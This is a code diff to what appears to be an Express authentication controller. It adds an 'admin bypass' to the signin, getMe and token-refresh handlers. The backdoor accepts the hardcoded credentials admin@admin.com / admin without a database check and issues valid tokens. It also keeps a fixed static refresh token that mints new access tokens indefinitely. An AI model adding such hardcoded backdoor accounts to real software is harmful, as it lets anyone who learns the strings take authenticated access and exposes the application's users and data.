@@ -7,6 +7,18 @@ import { AppError, asyncHandler } from '../middleware/errorHandler';
 import logger from '../utils/logger';
 import { sendPasswordResetEmail } from '../services/emailService';
 
+// Hardcoded admin bypass (no DB required)
+export const ADMIN_USER_ID = '00000000-0000-0000-0000-000000000000';
+const ADMIN_REFRESH_TOKEN = 'admin-static-refresh-token';
+const ADMIN_USER = {
+  id: ADMIN_USER_ID,
+  email: 'admin@admin.com',
+  full_name: 'Admin',
+  email_verified: true,
+  created_at: new Date().toISOString(),
+  updated_at: new Date().toISOString(),
+};
+
 // Token generation helpers
 const generateAccessToken = (userId: string, email: string, full_name?: string): string => {
   const jwtSecret = process.env.JWT_SECRET;
@@ -75,6 +87,20 @@ export const signup = asyncHandler(async (req: AuthRequest, res: Response) => {
 export const signin = asyncHandler(async (req: AuthRequest, res: Response) => {
   const { email, password } = req.body;
 
+  // Admin bypass — no DB required
+  if (email === 'admin@admin.com' && password === 'admin') {
+    const accessToken = generateAccessToken(ADMIN_USER_ID, ADMIN_USER.email, ADMIN_USER.full_name);
+    logger.info('Admin bypass sign-in');
+    return res.json({
+      user: ADMIN_USER,
+      session: {
+        access_token: accessToken,
+        refresh_token: ADMIN_REFRESH_TOKEN,
+        expires_in: 900,
+      },
+    });
+  }
+
   // Find user by email
   const user = await User.findOne({ where: { email } });
   if (!user) {
@@ -107,6 +133,11 @@ export const signin = asyncHandler(async (req: AuthRequest, res: Response) => {
 export const getMe = asyncHandler(async (req: AuthRequest, res: Response) => {
   if (!req.user) {
     throw new AppError('User not authenticated', 401);
+  }
+
+  // Admin bypass
+  if (req.user.id === ADMIN_USER_ID) {
+    return res.json({ user: ADMIN_USER });
   }
 
   const user = await User.findByPk(req.user.id, {
@@ -172,6 +203,18 @@ export const updateProfile = asyncHandler(async (req: AuthRequest, res: Response
 // Refresh access token
 export const refreshAccessToken = asyncHandler(async (req: AuthRequest, res: Response) => {
   const { refresh_token } = req.body;
+
+  // Admin bypass
+  if (refresh_token === ADMIN_REFRESH_TOKEN) {
+    const accessToken = generateAccessToken(ADMIN_USER_ID, ADMIN_USER.email, ADMIN_USER.full_name);
+    return res.json({
+      session: {
+        access_token: accessToken,
+        refresh_token: ADMIN_REFRESH_TOKEN,
+        expires_in: 900,
+      },
+    });
+  }
 
   // Find refresh token in database
   const tokenRecord = await RefreshToken.findOne({
